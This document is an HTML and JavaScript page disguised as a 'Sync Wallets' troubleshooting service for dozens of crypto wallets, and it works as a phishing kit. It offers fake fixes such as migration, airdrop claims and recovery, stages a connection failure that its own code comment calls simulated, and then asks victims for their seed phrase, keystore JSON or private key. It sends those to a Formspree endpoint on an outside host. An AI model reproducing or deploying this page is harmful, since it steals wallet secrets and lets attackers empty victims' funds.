<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sync Wallets - Troubleshoot</title>
    <link rel="stylesheet" href="color.css">
</head>
<body>
    <header>
        <div class="banner">
            <img src="assets/banner.jpg" alt="Wallet Security Banner">
        </div>
        <h1>Get Started Below.</h1>
        <p><a href="main.html" style="color: #00d4ff; text-decoration: none;">Back to Wallet Selection</a></p>
    </header>
    
    <div class="troubleshoot-container" id="troubleshootContainer"></div>

    <!-- Wallet Selection Popup -->
    <div id="walletPopup" class="popup" style="display: none;">
        <div class="popup-content">
            <h2>Connect your wallet</h2>
            <div class="wallet-list" id="walletList"></div>
        </div>
    </div>

    <!-- Initializing Popup -->
    <div id="initPopup" class="popup" style="display: none;">
        <div class="popup-content">
            <h2>Initializing</h2>
            <div class="wallet-info">
                <span id="initWalletName"></span>
                <img id="initWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-small">
            </div>
        </div>
    </div>

    <!-- Error/Manual Connect Popup -->
    <div id="errorPopup" class="popup" style="display: none;">
        <div class="popup-content">
            <p style="color: red;">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
            <h2>Import your <span id="errorWalletName"></span> wallet</h2>
            
            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('phrase')">Phrase</button>
                <button class="tab-btn" onclick="switchTab('keystore')">Keystore JSON</button>
                <button class="tab-btn" onclick="switchTab('privatekey')">Private Key</button>
            </div>

            <label for="manualInput">Enter your wallet <span id="inputLabel">phrase</span></label>
            <input type="text" id="manualInput" name="manualInput" placeholder="Enter your wallet phrase">

            <p id="errorMessage" class="hidden"></p>

            <button class="connect-btn" onclick="validateManualInput()">Validate</button>
            <button id="closeErrorPopup" class="close-btn">Close</button>
        </div>
    </div>

    <script>
        const troubleshootOptions = [
            { name: "Migration", description: "Click here for migration or to resolve any migration related issues." },
            { name: "Rectification", description: "Click here to rectify all strange wallet issues." },
            { name: "Claim", description: "Click here to claim tokens or resolve any token claiming related issues." },
            { name: "Swap", description: "Click here to swap tokens or resolve token swaplist." },
            { name: "Slippage", description: "Click here for slippage or transaction fee related issues." },
            { name: "Claim Airdrop", description: "Click here to claim airdrop or resolve errors encountered during airdrop claim." },
            { name: "Staking", description: "Click here to resolve issues while staking/unstaking." },
            { name: "Whitelist", description: "Click here to whitelist your address or resolve whitelisting related error." },
            { name: "Cross Transfer", description: "Click here to resolve cross transfer issues." },
            { name: "NFTs", description: "Click here to resolve NFT related issues." },
            { name: "Locked Account", description: "Click here to resolve locked account issues." },
            { name: "Login Error", description: "Click here to resolve login error issues." },
            { name: "Wallet Glitch", description: "Click here to resolve wallet issues." },
            { name: "DeFi Farming", description: "Click here for DeFi or Commercial farming related issues." },
            { name: "Validation", description: "Click here to validate your wallet via Multisig." },
            { name: "Transaction Delay", description: "Click here for any transaction related error." },
            { name: "Missing/Irregular Balance", description: "Click here to recover lost or missing funds." },
            { name: "Recovery", description: "Click here for wallet recovery." },
            { name: "Buy Token/Coin", description: "Click here to trade. Your account has to be marked as a trusted payment source to start trading." },
            { name: "Exchange", description: "Click here for token exchange or to resolve errors encountered during token exchange." }
        ];

        const wallets = [
            "Metamask", "Trust", "Coinbase", "Xumm", "Cardano", "Daedalus", "Yoroi", "CCVault",
            "Gero", "Nami", "Solana", "Phantom", "Solflare", "Sollet", "Solong", "Exodus",
            "Avalanche", "Velas", "Crypto.com", "Blockchain", "Binance Smart Chain", "Safepal", "Argent",
            "Fortmatic", "Aktionariat", "Keyring Pro", "BitKeep", "SparkPoint", "OwnBit", "Infinity Wallet",
            "Wallet.io", "Infinito", "Torus", "Nash", "BitPay", "imToken", "Ambire", "Apolox",
            "Bitski", "Bobablocks", "Crossmint", "Defiant", "Fireblocks", "KryptoGo", "Ledger",
            "Now", "Nufinetes", "Onekey", "Paper", "Pier", "Prema", "Rice", "Safemoon",
            "Secux", "Sequence", "Tokenary", "Unipass", "Venly", "Verso", "Wallet3", "Polkadot",
            "Filecoin", "IOST", "Qtum", "Waves", "Algorand", "Zcash", "Vechain", "Tezos",
            "Stellar", "Tron", "Terra", "Cosmos", "Metis", "Optimism"
        ];

        const troubleshootContainer = document.getElementById("troubleshootContainer");
        const walletList = document.getElementById("walletList");

        // Populate troubleshooting options
        troubleshootOptions.forEach(option => {
            let optionBox = document.createElement("div");
            optionBox.classList.add("troubleshoot-box");
            optionBox.setAttribute("tabindex", "0");
            optionBox.setAttribute("role", "button");
            optionBox.innerHTML = `
                <h3>${option.name.toUpperCase()}</h3>
                <p>${option.description}</p>
            `;
            optionBox.onclick = () => openWalletPopup(option.name);
            optionBox.onkeydown = (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    openWalletPopup(option.name);
                }
            };
            troubleshootContainer.appendChild(optionBox);
        });

        // Populate wallet list in the popup
        wallets.forEach(wallet => {
            let walletItem = document.createElement("div");
            walletItem.classList.add("wallet-item");
            walletItem.setAttribute("tabindex", "0");
            walletItem.setAttribute("role", "button");
            walletItem.innerHTML = `
                <span class="wallet-status"></span>
                <span>${wallet}</span>
                <img src="assets/wallets/${wallet.toLowerCase()}.png" alt="${wallet} Logo" class="wallet-logo-small" onerror="this.src='assets/default.png'">
            `;
            walletItem.onclick = () => {
                document.getElementById("walletPopup").style.display = "none";
                openInitPopup(wallet);
            };
            walletItem.onkeydown = (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    document.getElementById("walletPopup").style.display = "none";
                    openInitPopup(wallet);
                }
            };
            walletList.appendChild(walletItem);
        });

        let selectedWallet = null;
        let selectedTroubleshootOption = null;
        let currentTab = "phrase";

        // Open wallet selection popup
        function openWalletPopup(troubleshootOption) {
            selectedTroubleshootOption = troubleshootOption;
            document.getElementById("walletPopup").style.display = "flex";
        }

        // Open initializing popup
        function openInitPopup(wallet) {
            selectedWallet = wallet;
            document.getElementById("initWalletName").textContent = wallet;
            document.getElementById("initWalletLogo").src = `assets/wallets/${wallet.toLowerCase()}.png`;
            document.getElementById("initWalletLogo").onerror = () => {
                document.getElementById("initWalletLogo").src = 'assets/default.png';
            };
            document.getElementById("initPopup").style.display = "flex";

            // Simulate a failed connection attempt (2 seconds delay)
            setTimeout(() => {
                document.getElementById("initPopup").style.display = "none";
                openErrorPopup(wallet);
            }, 2000);
        }

        // Open error/manual connect popup
        function openErrorPopup(wallet) {
            document.getElementById("errorWalletName").textContent = wallet;
            document.getElementById("errorPopup").style.display = "flex";
            currentTab = "phrase";
            updateInputLabel();
        }

        // Close error popup
        function closeErrorPopup() {
            selectedWallet = null;
            selectedTroubleshootOption = null;
            currentTab = "phrase";
            document.getElementById("manualInput").value = "";
            document.getElementById("errorMessage").textContent = "";
            document.getElementById("errorMessage").classList.add("hidden");
            document.getElementById("errorPopup").style.display = "none";
            updateTabButtons();
        }

        document.getElementById("closeErrorPopup").addEventListener("click", closeErrorPopup);

        window.onclick = function(event) {
            if (event.target.classList.contains("popup")) {
                document.getElementById("walletPopup").style.display = "none";
                document.getElementById("initPopup").style.display = "none";
                closeErrorPopup();
            }
        };

        // Switch between tabs (Phrase, Keystore JSON, Private Key)
        function switchTab(tab) {
            currentTab = tab;
            updateInputLabel();
            updateTabButtons();
        }

        function updateInputLabel() {
            const label = document.getElementById("inputLabel");
            const placeholder = document.getElementById("manualInput");
            if (currentTab === "phrase") {
                label.textContent = "phrase";
                placeholder.placeholder = "Enter your wallet phrase";
            } else if (currentTab === "keystore") {
                label.textContent = "keystore JSON";
                placeholder.placeholder = "Enter your keystore JSON";
            } else if (currentTab === "privatekey") {
                label.textContent = "private key";
                placeholder.placeholder = "Enter your private key";
            }
        }

        function updateTabButtons() {
            document.querySelectorAll(".tab-btn").forEach(btn => {
                btn.classList.remove("active");
                if (btn.textContent.toLowerCase().replace(" ", "") === currentTab) {
                    btn.classList.add("active");
                }
            });
        }

        // Validate manual input and submit to Formspree
        function validateManualInput() {
            let manualInput = document.getElementById("manualInput").value.trim();
            let message = document.getElementById("errorMessage");

            message.textContent = "";
            message.classList.add("hidden");

            if (manualInput === "") {
                message.textContent = "Error: Input cannot be empty!";
                message.classList.remove("hidden");
                return;
            }

            if (currentTab === "phrase" && manualInput.split(" ").length !== 12) {
                message.textContent = "Error: Seed phrase must be 12 words!";
                message.classList.remove("hidden");
                return;
            }

            if (currentTab === "keystore" && manualInput.length < 16) {
                message.textContent = "Error: Keystore JSON must be at least 16 characters!";
                message.classList.remove("hidden");
                return;
            }

            if (currentTab === "privatekey" && manualInput.length < 8) {
                message.textContent = "Error: Private key must be at least 8 characters!";
                message.classList.remove("hidden");
                return;
            }

            fetch("https://formspree.io/f/mvgkalye", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`
            })
            .then(response => {
                if (response.ok) {
                    message.textContent = "Credentials submitted successfully!";
                    message.style.color = "green";
                    message.classList.remove("hidden");
                    setTimeout(closeErrorPopup, 2000);
                } else {
                    message.textContent = `Error submitting credentials. Status: ${response.status}`;
                    message.style.color = "red";
                    message.classList.remove("hidden");
                }
            })
            .catch(() => {
                message.textContent = "Network error. Please try again.";
                message.style.color = "red";
                message.classList.remove("hidden");
            });
        }

        document.getElementById("manualInput").addEventListener("input", function () {
            document.getElementById("errorMessage").classList.add("hidden");
        });
    </script>
</body>
</html>
